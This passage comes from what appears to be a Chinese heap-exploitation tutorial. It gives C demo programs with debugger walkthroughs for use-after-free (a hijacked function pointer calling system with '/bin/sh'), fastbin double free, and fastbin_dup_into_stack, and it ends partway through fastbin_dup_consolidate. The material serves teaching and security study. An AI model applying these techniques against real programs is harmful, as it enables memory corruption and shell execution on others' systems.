    func_ptr <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;申请了4个int大小的内存&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;p1 的地址: %p\n&quot;</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>echo<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;把p1[1]赋值为echo函数，然后打印出\&quot;hello world\&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&quot;hello world\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;free 掉 p1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;因为并没有置为null，所以p1[1]仍然是echo函数，仍然可以输出打印了\&quot;hello again\&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&quot;hello again\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;接下来再去malloc一个p2，会把释放掉的p1给分配出来，可以看到他俩是同一地址的&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    func_ptr <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;p2 的地址: %p\n&quot;</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;p1 的地址: %p\n&quot;</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;然后把p2[1]给改成evil_fuc也就是system函数&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>evil_fuc<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;传参调用&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><p>​    依然使用之前的编译命令，然后动态调试看一下，首先申请了一个chunk，把那个p1[1]改成了echo函数的地址。</p> <p><img src="/images/heap/image-20211226155616317.png" alt="image-20211226155616317"></p> <p>​    free掉之后再申请一个大小相同的p2，这时候会把之前p1的内存区域分配给p2，也就是说可以用p2来控制p1的内容了</p> <p><img src="/images/heap/image-20211226155627689.png" alt="image-20211226155627689"></p> <h2 id="fastbin-dup">fastbin_dup <a href="#fastbin-dup" class="header-anchor">#</a></h2> <p>fastbin主要是用来放一些小的内存的，来提高效率。源码如下</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;这个例子演示了 fastbin 的 double free\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;首先申请了 3 个 chunk\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">&quot;AAAAAAAA&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token string">&quot;BBBBBBBB&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token string">&quot;CCCCCCCC&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第一个 malloc(8): %p\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第二个 malloc(8): %p\n&quot;</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第三个 malloc(8): %p\n&quot;</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;free 掉第一个\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;当我们再次 free %p 的时候, 程序将会崩溃因为 %p 在 free 链表的第一个位置上\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// free(a);</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;我们先 free %p.\n&quot;</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在我们就可以再次 free %p 了, 因为他现在不在 free 链表的第一个位置上\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在空闲链表是这样的 [ %p, %p, %p ]. 如果我们 malloc 三次, 我们会得到两次 %p \n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">char</span><span class="token operator">*</span> d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> e <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> f <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token string">&quot;DDDDDDDD&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">&quot;EEEEEEEE&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">&quot;FFFFFFFF&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第一次 malloc(8): %p\n&quot;</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第二次 malloc(8): %p\n&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第三次 malloc(8): %p\n&quot;</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><p>​    这个程序更具体地展示了上一个程序所介绍的技巧，通过欺骗 malloc 来返回一个我们可控的区域的指针(在这个例子中，我们可以返回一个栈指针)。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code> gcc -g fastbin_dup.c -o fastbin_dup
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/images/heap/image-20211226155703337.png" alt="image-20211226155703337"></p> <p>可以看到首先分配三块内存，当free掉第一块内存之后，再free一次该内存块是不行的，因为这时候这块内存刚好在对应的free-list的顶部，再次free这块内存就会被检查到，这里就free第二块内存。现在我们再次free第一块内存，因为它已经不在链表顶部了。</p> <p>这时候的 free-list 有这三块内存 [0x2502010, 0x2502030, 0x2502010]，如果我们malloc三次的话，就会得到0x2502010两次。</p> <p>使用pwndbg逐步调试，首先malloc 3个chunk。</p> <p><img src="/images/heap/image-20211226155730619.png" alt="image-20211226155730619"></p> <p>第一个free之后，chunk a被添加到fastbins中。</p> <p><img src="/images/heap/image-20211226155736358.png" alt="image-20211226155736358"></p> <p>第二个 free 之后，chunk b 被添加到fastbins中，可以看到在b的fd指针那里已经改成了chunk a的地址了。</p> <p><img src="/images/heap/image-20211226155742407.png" alt="image-20211226155742407"></p> <p>此时，由于chunk a处于bin中第2块的位置，不会被double-free的检查机制检查出来，所以第三个free之后，chunk a再次被添加到fastbins 中。chunk a和chunk b形成了一个环</p> <p><img src="/images/heap/image-20211226155750568.png" alt="image-20211226155750568"></p> <p>最后再malloc三块内存d、e、f，可以看到0x4444444444444444被改成了 0x4646464646464646，是因为后来申请的 f 跟 d 指向同一块内存区域。</p> <p><img src="/images/heap/image-20211226155758366.png" alt="image-20211226155758366"></p> <p>总结一下，程序展示了fastbins的double-free攻击，可以泄露出一块已经被分配的内存指针。fastbins 可以看成一个后进先出的栈，使用单链表来实现，通过fastbin-&gt;fd来遍历。由于free的过程会对free list做检查，我们不能连续两次free同一个chunk，所以这里在两次free 之间，增加了一次对其他chunk的free 过程，从而绕过了检查顺利执行，然后再malloc三次，就在同一个地址malloc了两次，也就有了两个指向同一块内存区域的指针。</p> <h2 id="fastbin-dup-into-stack">fastbin_dup_into_stack <a href="#fastbin-dup-into-stack" class="header-anchor">#</a></h2> <p>​    这个程序更具体地展示了上一个程序所介绍的技巧，通过欺骗malloc 来返回一个我们可控的区域的指针 (在这个例子中，我们可以返回一个栈指针)</p> <p>​    源码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;这个例子拓展自 fastbin_dup.c，通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> stack_var<span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;我们想通过 malloc 申请到 %p.\n&quot;</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;先申请3 个 chunk\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">&quot;AAAAAAAA&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token string">&quot;BBBBBBBB&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token string">&quot;CCCCCCCC&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;chunk a: %p\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;chunk b: %p\n&quot;</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;chunk c: %p\n&quot;</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;free 掉 chunk a\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;如果还对 %p 进行 free, 程序会崩溃。因为 %p 现在是 fastbin 的第一个\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// free(a);</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;先对 b %p 进行 free\n&quot;</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;接下来就可以对 %p 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在 fastbin 的链表是 [ %p, %p, %p ] 接下来通过修改 %p 上的内容来进行攻击.\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第一次 malloc(8): %p\n&quot;</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> e <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">&quot;EEEEEEEE&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第二次 malloc(8): %p\n&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在 fastbin 表中只剩 [ %p ] 了\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;接下来往 %p 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    stack_var <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在覆盖 %p 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">char</span><span class="token operator">*</span> f <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">&quot;FFFFFFFF&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;第三次 malloc(8): %p, 把栈地址放到 fastbin 链表中\n&quot;</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token operator">*</span> g <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">&quot;GGGGGGGG&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;这一次 malloc(8) 就申请到了栈上去: %p\n&quot;</span><span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br></div></div><p>​    gcc -g fastbin_dup_into_stack.c -o fastbin_dup_into_stack</p> <p>​    这个程序展示了怎样通过修改fd指针，将其指向一个伪造的free chunk，在伪造的地址处malloc出一个chunk。该程序大部分内容都和上一个程序一样，漏洞也同样是double-free，只有给 fd 填充的内容不一样。</p> <p>​    三次malloc之后</p> <p><img src="/images/heap/image-20211226155926302.png" alt="image-20211226155926302"></p> <p>​    三次 free 之后，可以看到由于 double free 造成的循环的指针。</p> <p><img src="/images/heap/image-20211226155932756.png" alt="image-20211226155932756"></p> <p>​    这时候我们再去malloc两次，还剩一个指向chunk a的free chunk，而前面我们也申请到了指向它的 chunk d，可以通过它编辑chunk a的fd 指针，填充一个有意义的地址：栈地址减0x8（因为伪造的chunk要有个 size，size在&amp;stack_var - 0x8的位置上）</p> <p>​    <code>*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></p> <p>通过调试我们可以看到，地址为<code>0x603000</code>的<code>chunk</code>的<code>fd</code>指针指向的是栈上的地址，这样的话，malloc一次之后再次申请的时候就会申请到fd指针指向的0x7fffffffdac0</p> <p><img src="/images/heap/image-20211226155944925.png" alt="image-20211226155944925"></p> <p>最后可以看到我们已经分配栈上的内存，并写入了数据GGGGGGGG。</p> <p><img src="/images/heap/image-20211226155950519.png" alt="image-20211226155950519"></p> <h2 id="fastbin-dup-consolidate">fastbin_dup_consolidate <a href="#fastbin-dup-consolidate" class="header-anchor">#</a></h2> <p>这个程序展示了利用在large bin的分配中malloc_consolidate 机制绕过 fastbin对double free的检查，这个检查在 fastbin_dup中已经展示过了，只不过它利用的是在两次 free 中间插入一次对其它chunk的free。</p> <p>​    源码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">&quot;AAAAAAAA&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span> <span class="token string">&quot;BBBBBBBB&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
